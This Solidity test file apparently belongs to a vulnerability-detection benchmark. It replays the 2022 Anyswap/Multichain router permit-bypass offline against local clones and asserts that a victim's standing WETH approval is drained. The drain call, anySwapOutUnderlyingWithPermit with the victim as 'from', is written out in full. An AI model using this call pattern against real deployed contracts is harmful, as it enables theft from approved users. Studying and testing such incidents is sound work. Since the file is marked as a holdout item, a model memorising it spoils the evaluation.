// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {
    WethNoPermit,
    AnyswapV4RouterClone
} from "../fixtures/permit-phishing/b-incident/AnyswapRouterClone.sol";

/// @title permit-phishing (b) real-incident HOLDOUT: Anyswap/Multichain V4Router permit-bypass
///        (2022-01-19). Minimized OFFLINE replay (no live RPC): a victim who approved the router
///        is drained when anyone calls anySwapOutUnderlyingWithPermit with the victim as `from` -
///        the forwarded permit on WETH is a no-op (no signature checked), and the router spends
///        the victim's standing approval. Verdict derived from the real outcome (balance leaves
///        the victim), not hardcoded. See PROVENANCE.md. HOLDOUT (label=vuln).
contract AnyswapIncidentTest is Test {
    // Verified attacker EOA (coinspect learn-evm-attacker / BlockSec / Zengo; see PROVENANCE.md).
    address constant ATTACKER = 0xFA2731d0BEde684993AB1109DB7ecf5bF33E8051;
    // Victim: a coinspect PoC constant, NOT confirmed on-chain - EXPLICIT stand-in.
    address constant VICTIM = 0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB;
    uint256 constant AMOUNT = 308636644758370382903; // exact coinspect PoC stole_WETH (~308.64 WETH)

    function _report(string memory target, bool drained) internal pure {
        console.log(
            string.concat(
                "[permit-phishing] target=", target, " verdict=", drained ? "VULNERABLE" : "BLOCKED"
            )
        );
    }

    function test_anyswapPermitBypassIncident_isDrained() public {
        WethNoPermit weth = new WethNoPermit();
        AnyswapV4RouterClone router = new AnyswapV4RouterClone();

        weth.mint(VICTIM, AMOUNT);
        // The victim had previously approved the router (the documented precondition).
        vm.prank(VICTIM);
        weth.approve(address(router), type(uint256).max);

        // Anyone calls the router with the victim as `from`; the forwarded permit is a no-op on
        // WETH (fallback success, no signature checked), then transferFrom spends the approval.
        vm.prank(ATTACKER);
        router.anySwapOutUnderlyingWithPermit(VICTIM, address(weth), AMOUNT, ATTACKER, block.timestamp, 0, 0, 0);

        bool drained = weth.balanceOf(ATTACKER) == AMOUNT && weth.balanceOf(VICTIM) == 0;
        _report("anyswap-permit-bypass-victim", drained);

        assertTrue(drained, "the permit-bypass should drain the victim's standing approval");
        assertEq(weth.balanceOf(ATTACKER), AMOUNT, "attacker received the victim's WETH");
    }
}
